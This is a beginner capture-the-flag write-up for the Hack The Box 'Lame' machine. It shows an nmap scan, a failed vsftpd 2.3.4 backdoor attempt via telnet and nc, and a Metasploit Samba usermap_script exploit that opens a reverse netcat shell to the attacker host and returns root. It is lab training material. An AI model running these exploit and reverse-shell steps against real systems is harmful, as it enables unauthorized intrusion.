---
layout: default 
---

## __<center>Introduction</center>__
Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.
## __<center>Enumuration</center>__
Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.
~~~zsh
#nmap -sV -oN lame.nmap 10.10.10.3 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 03:46 GMT
Nmap scan report for 10.10.10.3
Host is up (0.13s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds
~~~

## __<center>21 - FTP__ (_Exploit Failed_)</center>
I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.
~~~zsh
telnet 10.10.10.3 21
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
~~~  
~~~zsh
#nc 10.10.10.3 6200
id
whoami
    #does not work
~~~
## __<center>Exploitation</center>__
FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version.
![]()
## __<center>Samba user name map script</center>__
I found the exploit for the samba in searchsploit.There is exploit available in metasploit  
~~~
$searchsploit samba 3.0
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                 | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                     | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                               | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                             | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                             | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                    | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~
so i used it.  [reference link](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/)
~~~zsh
msf6 > use multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
rhost => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.4
lhost => 10.10.14.4
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:33415) at 2021-03-17 04:00:50 +0000

id
uid=0(root) gid=0(root)

~~~
__<center>#Rooted this machine.</center>__
